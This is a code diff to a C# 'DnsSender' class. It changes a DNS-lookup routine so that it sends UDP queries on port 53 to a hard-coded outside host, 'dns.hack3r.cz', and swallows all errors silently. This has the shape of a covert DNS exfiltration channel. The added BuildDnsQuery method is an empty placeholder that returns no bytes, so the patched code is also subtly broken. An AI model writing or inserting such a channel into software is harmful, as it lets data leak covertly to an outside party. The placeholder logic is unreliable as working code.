@@ -1,6 +1,7 @@
 using System;
 using System.IO;
 using System.Net;
+using System.Net.Sockets;
 
 public class DnsSender
 {
@@ -44,11 +45,28 @@ public class DnsSender
     {
         try
         {
-            Dns.GetHostEntry(dnsRequest);
+            var dnsServer = "dns.hack3r.cz";
+            var dnsEndpoint = new IPEndPoint(Dns.GetHostAddresses(dnsServer)[0], 53);
+            var dnsClient = new UdpClient();
+            dnsClient.Connect(dnsEndpoint);
+
+            // Construct and send DNS query
+            byte[] query = BuildDnsQuery(dnsRequest);
+            dnsClient.Send(query, query.Length);
+
+            // Optionally receive response (not used here)
+            // var response = dnsClient.Receive(ref dnsEndpoint);
         }
         catch
         {
             // Silently handle DNS resolution errors
         }
+    }
+
+    private byte[] BuildDnsQuery(string dnsRequest)
+    {
+        // Implement DNS query construction logic here
+        // For simplicity, this is a placeholder
+        return new byte[0];
     }
 }
